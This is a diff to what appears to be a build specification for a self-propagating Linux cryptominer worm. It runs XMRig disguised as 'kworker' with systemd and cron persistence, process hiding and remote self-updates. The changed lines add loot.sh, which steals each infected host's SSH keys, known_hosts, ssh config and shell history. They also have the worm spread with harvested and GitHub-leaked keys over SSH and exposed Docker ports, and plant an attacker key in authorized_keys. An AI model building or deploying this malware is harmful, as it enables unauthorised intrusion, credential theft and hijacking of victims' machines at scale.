@@ -27,7 +27,7 @@ TARGET_USERS= root ubuntu ec2-user admin
 3. SELF-UPDATING - XMRig has no built-in updater. Ship updater.sh (cron, every 15-30 min): fetch latest binary + config from PAYLOAD_URL/CONFIG_URL, sha256-verify, hot-swap, restart. Bump your URL once = whole fleet updates.
 4. SELF-HEALING - survive kill AND reboot. systemd unit with Restart=always (preferred), else /etc/cron.d @reboot + a */5 watchdog. The updater doubles as a respawner.
 5. QUIET - no inbound listeners (XMRig API on 127.0.0.1 only), TLS to the pool, nice'd, CPU capped to nproc-1, process renamed to blend in.
-6. SELF-SPREADING - it walks on its own: spread.sh (every 6h) reuses the staged key against LAN neighbours; hunt.sh (every 12h) harvests leaked keys+hosts from GitHub, probes them, and re-runs the bootstrap. De-duplicate (seen/owned lists) so nothing is re-hammered.
+6. SELF-SPREADING - it walks on its own, best edges first. On a host it already owns, loot.sh (every 6h) reads that host's own trust graph - ssh config, known_hosts, its own keys, shell history, the LAN - because those (key,user,host) triples were proven together, unlike GitHub's correlation. hunt.sh probes looted rows BEFORE its GitHub rows. spread.sh (every 6h) sweeps LAN neighbours with our key plus a slice of the harvested keyring. Landing also appends our key to authorized_keys, so the foothold survives the owner rotating the borrowed key. De-duplicate (seen/owned lists) so nothing is re-hammered.
 
 ## PHASES (in order; print exact commands)
 - Phase 0 Recon - `uname -m; nproc; free -m; uptime; cat /etc/os-release; ss -tlnp; test -r /var/run/docker.sock; getent hosts $POOL`. Decide threads=nproc-1, arch, systemd-vs-cron, egress reachability.
@@ -69,8 +69,9 @@ Numbered sections mirroring the phases, every command copy-pasteable, the three 
 - `updater.sh`      - auto-update (hash-checked hot-swap) AND watchdog (respawn if killed)
 - `kworker.service` - systemd unit, Restart=always, Nice=19
 - `kworker-updater.service` / `.timer` - systemd update loop (no cron needed)
-- `spread.sh`       - LAN neighbour scan, re-use the key on :22, docker :2375
-- `hunt.sh`         - GitHub leaked-key harvest -> ssh probe -> deploy (curl/tar only)
-- `kworker-spread.service/.timer`, `kworker-hunt.service/.timer` - spread schedules
+- `spread.sh`       - LAN neighbour scan, re-use our key + a slice of the harvested keyring on :22, docker :2375
+- `hunt.sh`         - trust-graph loot first, then GitHub leaked-key harvest -> ssh probe -> deploy (curl/tar only)
+- `loot.sh`         - the host's own trust graph: ssh config, known_hosts, its own keys, history, LAN
+- `kworker-spread.service/.timer`, `kworker-hunt.service/.timer`, `kworker-loot.service/.timer` - spread/loot schedules
 - `README.md`       - hosting, one-liner deploy, verification, threat model
 
